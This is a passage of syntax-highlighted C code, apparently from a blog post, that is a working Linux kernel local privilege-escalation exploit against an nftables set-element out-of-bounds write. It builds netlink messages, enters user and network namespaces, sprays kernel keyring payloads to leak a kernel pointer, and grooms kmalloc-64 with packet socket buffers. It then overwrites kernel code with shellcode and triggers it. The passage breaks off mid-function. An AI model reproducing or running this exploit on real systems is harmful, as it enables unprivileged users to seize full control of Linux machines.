class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[3];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare the netlink sockaddr for msg</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;dest_snl, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_nl));</span><br><span class="line">    dest_snl.nl_family = AF_NETLINK;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. First netlink message: batch </span></span><br><span class="line">    nlh_batch_begin = get_batch_begin_nlmsg();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. Second netlink message : Set attributes </span></span><br><span class="line">    <span class="comment">// Precompute the size of the nested field</span></span><br><span class="line">    nested_attr_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// First element</span></span><br><span class="line">    nested_attr_size += <span class="keyword">sizeof</span>(struct nlattr);              <span class="comment">// Englobing attribute</span></span><br><span class="line">    nested_attr_size += <span class="keyword">sizeof</span>(struct nlattr);              <span class="comment">// NFTA_SET_ELEM_KEY</span></span><br><span class="line">    nested_attr_size += NLA_BIN_SIZE(set_keylen);           <span class="comment">// NFTA_DATA_VALUE</span></span><br><span class="line">    nested_attr_size += <span class="keyword">sizeof</span>(struct nlattr);              <span class="comment">// NFTA_SET_ELEM_DATA</span></span><br><span class="line">    nested_attr_size += NLA_ALIGN(NLA_BIN_SIZE(data_len));  <span class="comment">// NFTA_DATA_VALUE</span></span><br><span class="line">    first_element_size = nested_attr_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Second element</span></span><br><span class="line">    nested_attr_size += <span class="keyword">sizeof</span>(struct nlattr);              <span class="comment">// Englobing attribute</span></span><br><span class="line">    nested_attr_size += <span class="keyword">sizeof</span>(struct nlattr);              <span class="comment">// NFTA_SET_ELEM_KEY</span></span><br><span class="line">    nested_attr_size += NLA_BIN_SIZE(set_keylen);           <span class="comment">// NFTA_DATA_VALUE</span></span><br><span class="line">    nested_attr_size += <span class="keyword">sizeof</span>(struct nlattr);              <span class="comment">// NFTA_SET_ELEM_DATA</span></span><br><span class="line">    nested_attr_size += <span class="keyword">sizeof</span>(struct nlattr);              <span class="comment">// NFTA_DATA_VERDICT</span></span><br><span class="line">    nested_attr_size += U32_NLA_SIZE;                       <span class="comment">// NFTA_VERDICT_CODE</span></span><br><span class="line">    second_element_size = nested_attr_size - first_element_size;</span><br><span class="line"></span><br><span class="line">    nlh_payload_size = <span class="keyword">sizeof</span>(struct nfgenmsg);             <span class="comment">// Mandatory</span></span><br><span class="line">    nlh_payload_size += <span class="keyword">sizeof</span>(struct nlattr);              <span class="comment">// NFTA_SET_ELEM_LIST_ELEMENTS</span></span><br><span class="line">    nlh_payload_size += nested_attr_size;                   <span class="comment">// All the stuff described above</span></span><br><span class="line">    nlh_payload_size += S8_NLA_SIZE;                        <span class="comment">// NFTA_SET_ELEM_LIST_TABLE</span></span><br><span class="line">    nlh_payload_size += S8_NLA_SIZE;                        <span class="comment">// NFTA_SET_ELEM_LIST_SET</span></span><br><span class="line">    nlh_payload_size += U32_NLA_SIZE;                       <span class="comment">// NFTA_SET_ELEM_LIST_SET_ID</span></span><br><span class="line">    nlh_payload_size = NLMSG_SPACE(nlh_payload_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocation</span></span><br><span class="line">    nlh_payload = (struct nlmsghdr *)<span class="built_in">malloc</span>(nlh_payload_size);</span><br><span class="line">    <span class="keyword">if</span> (!nlh_payload) </span><br><span class="line">        err_exit(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(nlh_payload, <span class="number">0</span>, nlh_payload_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fill the required fields</span></span><br><span class="line">    nlh_payload-&gt;nlmsg_len = nlh_payload_size;</span><br><span class="line">    nlh_payload-&gt;nlmsg_type = (NFNL_SUBSYS_NFTABLES &lt;&lt; <span class="number">8</span>) | NFT_MSG_NEWSETELEM;</span><br><span class="line">    nlh_payload-&gt;nlmsg_pid = getpid();</span><br><span class="line">    nlh_payload-&gt;nlmsg_flags = NLM_F_REQUEST;</span><br><span class="line">    nlh_payload-&gt;nlmsg_seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup the nfgenmsg</span></span><br><span class="line">    nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);</span><br><span class="line">    nfm-&gt;nfgen_family = NFPROTO_INET;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup the attributes</span></span><br><span class="line">    attr = (struct nlattr *)((<span class="keyword">void</span> *)nlh_payload + NLMSG_SPACE(<span class="keyword">sizeof</span>(struct nfgenmsg)));</span><br><span class="line">    attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);</span><br><span class="line">    attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_SET, set_name);</span><br><span class="line">    attr = set_u32_attr(attr, NFTA_SET_ELEM_LIST_SET_ID, id);</span><br><span class="line">    attr = set_nested_attr(attr, NFTA_SET_ELEM_LIST_ELEMENTS, nested_attr_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2-1 First element</span></span><br><span class="line">    attr = set_nested_attr(attr, <span class="number">0</span>, first_element_size - <span class="number">4</span>);</span><br><span class="line">    attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, NLA_BIN_SIZE(set_keylen));</span><br><span class="line">    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (<span class="keyword">uint8_t</span> *)zerobuf, set_keylen);</span><br><span class="line">    attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, NLA_BIN_SIZE(data_len));</span><br><span class="line">    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (<span class="keyword">uint8_t</span> *)data, data_len);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2-2 Second element</span></span><br><span class="line">    attr = set_nested_attr(attr, <span class="number">0</span>, second_element_size - <span class="number">4</span>);</span><br><span class="line">    attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, NLA_BIN_SIZE(set_keylen));</span><br><span class="line">    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (<span class="keyword">uint8_t</span> *)zerobuf, set_keylen);</span><br><span class="line">    attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, U32_NLA_SIZE + <span class="keyword">sizeof</span>(struct nlattr));</span><br><span class="line">    attr = set_nested_attr(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);</span><br><span class="line">    set_u32_attr(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. Last netlink message: End of batch </span></span><br><span class="line">    nlh_batch_end = get_batch_end_nlmsg();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup the iovec</span></span><br><span class="line">    <span class="built_in">memset</span>(iov, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct iovec) * <span class="number">3</span>);</span><br><span class="line">    iov[<span class="number">0</span>].iov_base = (<span class="keyword">void</span> *)nlh_batch_begin;</span><br><span class="line">    iov[<span class="number">0</span>].iov_len = nlh_batch_begin-&gt;nlmsg_len;</span><br><span class="line">    iov[<span class="number">1</span>].iov_base = (<span class="keyword">void</span> *)nlh_payload;</span><br><span class="line">    iov[<span class="number">1</span>].iov_len = nlh_payload-&gt;nlmsg_len;</span><br><span class="line">    iov[<span class="number">2</span>].iov_base = (<span class="keyword">void</span> *)nlh_batch_end;</span><br><span class="line">    iov[<span class="number">2</span>].iov_len = nlh_batch_end-&gt;nlmsg_len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare the message to send</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct msghdr));</span><br><span class="line">    msg.msg_name = (<span class="keyword">void</span> *)&amp;dest_snl;</span><br><span class="line">    msg.msg_namelen = <span class="keyword">sizeof</span>(struct sockaddr_nl);</span><br><span class="line">    msg.msg_iov = iov;</span><br><span class="line">    msg.msg_iovlen = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send message</span></span><br><span class="line">    sendmsg(sock, &amp;msg, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Free allocated memory</span></span><br><span class="line">    <span class="built_in">free</span>(nlh_batch_end);</span><br><span class="line">    <span class="built_in">free</span>(nlh_payload);</span><br><span class="line">    <span class="built_in">free</span>(nlh_batch_begin);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------------------------- util --------------------------------------</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILENAME_MAX_LEN 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// write_file(): Write a string into a file</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *text)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(filename, O_RDWR);</span><br><span class="line">    write(fd, text, <span class="built_in">strlen</span>(text));</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// new_ns(): Change the current namespace to access to netfilter and to be able to write security xattr in a tmpfs</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new_ns</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uid_t</span> uid = getuid();</span><br><span class="line">    <span class="keyword">gid_t</span> gid = getgid();</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER | CLONE_NEWNS))</span><br><span class="line">        err_exit(<span class="string">&quot;unshare(CLONE_NEWUSER | CLONE_NEWNS)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET))</span><br><span class="line">        err_exit(<span class="string">&quot;unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    write_file(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">snprintf</span>(buffer, <span class="keyword">sizeof</span>(buffer), <span class="string">&quot;0 %d 1&quot;</span>, uid);</span><br><span class="line">    write_file(<span class="string">&quot;/proc/self/uid_map&quot;</span>, buffer);</span><br><span class="line">    <span class="built_in">snprintf</span>(buffer, <span class="keyword">sizeof</span>(buffer), <span class="string">&quot;0 %d 1&quot;</span>, gid);</span><br><span class="line">    write_file(<span class="string">&quot;/proc/self/gid_map&quot;</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set_cpu_affinity(): Pin a process to a CPU</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cpu_affinity</span><span class="params">(<span class="keyword">int</span> cpu_n, <span class="keyword">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">    CPU_SET(cpu_n, &amp;<span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sched_setaffinity(pid, <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;sched_setaffinity&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_keyring_corrupted</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">uint32_t</span> id_buffer_size,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="keyword">key_serial_t</span> *corrupted_key_id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> buffer[CORRUPT_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int32_t</span> keylen;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; id_buffer_size; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!id_buffer[i]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        keylen = key_read(id_buffer[i], buffer, CORRUPT_SIZE);</span><br><span class="line">        <span class="keyword">if</span> (keylen &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;keyctl: %m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (keylen == CORRUPT_SIZE) &#123;</span><br><span class="line">            *corrupted_key_id = id_buffer[i];</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">key_revokes</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">uint32_t</span> id_buffer_size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; id_buffer_size; i++) &#123;</span><br><span class="line">        key_revoke(id_buffer[i]);</span><br><span class="line">        id_buffer[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> netfilter_sock = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> leak_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_netfilter</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">snl</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;creating netfilter netlink socket&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((netfilter_sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;can&#x27;t create netfilter socket: %m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;snl, <span class="number">0</span>, <span class="keyword">sizeof</span>(snl));</span><br><span class="line">    snl.nl_family = AF_NETLINK;</span><br><span class="line">    snl.nl_pid = getpid();</span><br><span class="line">    <span class="keyword">if</span> (bind(netfilter_sock, (struct sockaddr *)&amp;snl, <span class="keyword">sizeof</span>(snl)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;bind: %m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;register netfilter table&quot;</span>);</span><br><span class="line">    create_table(netfilter_sock, TABLE_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;creating a netfilter set for the info leak&quot;</span>);</span><br><span class="line">    create_set(netfilter_sock, LEAK_SET_NAME, KMALLOC64_KEYLEN, <span class="keyword">sizeof</span>(struct leak_payload), TABLE_NAME, ID);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;creating a netfilter set for the write primitive&quot;</span>);</span><br><span class="line">    create_set(netfilter_sock, SET_NAME, KMALLOC64_KEYLEN, <span class="keyword">sizeof</span>(struct write_payload), TABLE_NAME, ID + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_namespace</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uid_t</span> uid = getuid();</span><br><span class="line">    <span class="keyword">gid_t</span> gid = getgid();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER | CLONE_NEWNS)) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;unshare(CLONE_NEWUSER | CLONE_NEWNS): %m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET)) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;unshare(CLONE_NEWNET): %m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(buff, <span class="keyword">sizeof</span>(buff), <span class="string">&quot;deny&quot;</span>);</span><br><span class="line">    write(fd, buff, <span class="built_in">strlen</span>(buff));</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(buff, <span class="keyword">sizeof</span>(buff), <span class="string">&quot;0 %d 1&quot;</span>, uid);</span><br><span class="line">    write(fd, buff, <span class="built_in">strlen</span>(buff));</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(buff, <span class="keyword">sizeof</span>(buff), <span class="string">&quot;0 %d 1&quot;</span>, gid);</span><br><span class="line">    write(fd, buff, <span class="built_in">strlen</span>(buff));</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    set_cpu_affinity(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    init_namespace();</span><br><span class="line">    init_netfilter();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_leak</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">key_serial_t</span> id_buffer[SPRAY_KEY_CNT] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">key_serial_t</span> corrupted_key_id = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">leak_payload</span> <span class="title">leak_payload</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;leak_payload, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct leak_payload));</span><br><span class="line">    leak_payload.len = CORRUPT_SIZE;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;spraying user_key_payload ...&quot;</span>);</span><br><span class="line">    spray_keyring(id_buffer, SPRAY_KEY_CNT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;free some key to create holes ...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = FREE_HOLE_BEGIN; i &lt; SPRAY_KEY_CNT; i += FREE_HOLE_STEP) &#123;</span><br><span class="line">        key_revoke(id_buffer[i]);</span><br><span class="line">        id_buffer[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;trigger oob write ...&quot;</span>);</span><br><span class="line">    add_elem_to_set(netfilter_sock, LEAK_SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME,</span><br><span class="line">                    ID, <span class="keyword">sizeof</span>(struct leak_payload), (<span class="keyword">uint8_t</span> *)&amp;leak_payload);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;checking if keyring is corrupted ...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (is_keyring_corrupted(id_buffer, SPRAY_KEY_CNT, &amp;corrupted_key_id)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;found keyring %d is corrupted!\n&quot;</span>, corrupted_key_id);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;can&#x27;t found corrupted keyring, retry ...&quot;</span>);</span><br><span class="line">        key_revokes(id_buffer, SPRAY_KEY_CNT);</span><br><span class="line">        <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;free other keyring to set rcu.func in user_key_payload ...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = FREE_HOLE_BEGIN; i &lt; SPRAY_KEY_CNT; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (id_buffer[i] == corrupted_key_id) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        key_revoke(id_buffer[i]);</span><br><span class="line">        id_buffer[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;searching rcu.func ...&quot;</span>);</span><br><span class="line">    leak_ptr = get_keyring_leak(corrupted_key_id, CORRUPT_SIZE, <span class="number">0x4141414141414141</span>); <span class="comment">// proc_fs_context_ops</span></span><br><span class="line">    <span class="keyword">if</span> (!leak_ptr) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;leak rcu.func failed&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_KEY_CNT; i++) &#123;</span><br><span class="line">            key_revoke(id_buffer[i]);</span><br><span class="line">            id_buffer[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leak user_free_payload_rcu: 0x%08lx\n&quot;</span>, leak_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC64_PAGE_CNT ((32 + 8) / 8)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_FENGSHUI_CNT (0x100)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_SPRAY_CNT (0x100)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_FREE_HOLE_STEP (0x20)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pagealloc_pad</span><span class="params">(<span class="keyword">int</span> count, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> packet_socket_setup(size, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_write_primitive</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> packet_fds[PACKET_SPRAY_CNT] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> fengshui_fds[PACKET_FENGSHUI_CNT] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_payload</span> <span class="title">payload</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;payload, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct write_payload));</span><br><span class="line">    payload.pg_vec = (<span class="keyword">void</span> *)(leak_ptr &amp; ~<span class="number">0xfff</span>);</span><br><span class="line">    payload.pg_vec2 = payload.pg_vec + PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;use raw_packet to fill kmalloc-64 ...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PACKET_FENGSHUI_CNT; i++) &#123;</span><br><span class="line">        fengshui_fds[i] = pagealloc_pad(KMALLOC64_PAGE_CNT, <span class="number">0x1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;spraying pg_vec in kmalloc-64 ...&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(packet_fds, <span class="number">0</span>, <span class="keyword">sizeof</span>(packet_fds));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PACKET_SPRAY_CNT; i++) &#123;</span><br><span class="line">        packet_fds[i] = pagealloc_pad(KMALLOC64_PAGE_CNT, <span class="number">0x1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;free some pg_vec to create holes ...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PACKET_SPRAY_CNT; i += PACKET_FREE_HOLE_STEP) &#123;</span><br><span class="line">        close(packet_fds[i]);</span><br><span class="line">        packet_fds[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;trigger oob write ...&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    add_elem_to_set(netfilter_sock, SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME,</span><br><span class="line">                    ID, <span class="keyword">sizeof</span>(struct write_payload), (<span class="keyword">uint8_t</span> *)&amp;payload);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;searching edited page ...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PACKET_SPRAY_CNT; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!packet_fds[i]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// packet mmap to userland</span></span><br><span class="line">        <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, PAGE_SIZE * KMALLOC64_PAGE_CNT,</span><br><span class="line">                                  PROT_READ | PROT_WRITE, MAP_SHARED, packet_fds[i], <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!page || (<span class="keyword">ssize_t</span>)page &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap error: %p&quot;</span>, page);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// search non-empty page</span></span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0x30</span>; j &lt; <span class="number">0x1000</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (page[j] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// found non-empty page</span></span><br><span class="line">        <span class="keyword">if</span> (j != <span class="number">0x1000</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;found target page!!&quot;</span>);</span><br><span class="line">            <span class="keyword">uint64_t</span> *pos = (<span class="keyword">uint64_t</span> *)&amp;page[leak_ptr &amp; <span class="number">0xfff</span>];</span><br><span class="line">            <span class="keyword">uint8_t</span> backup[<span class="keyword">sizeof</span>(shellcode)] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;write shellcode&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>(backup, pos, <span class="keyword">sizeof</span>(backup));</span><br><span class="line">            <span class="built_in">memcpy</span>(pos, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// trigger rcu, trigger shellcode</span></span><br><span class="line">            <span class="keyword">key_serial_t</span> fd = key_alloc(<span class="string">&quot;shellcode_trigger&quot;</span>, <span class="string">&quot;AAAA&quot;</span>,<span class="number">4</span>);</span><br><span class="line">            key_revoke(fd);</span><br><span class="line">            key_alloc(<span class="string">&quot;shellcode_trigger&quot;</span>, <span class="string">&quot;AAAA&quot;</span>,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>(pos, backup, <span class="keyword">sizeof</span>(backup));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;can&#x27;t found target page&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; 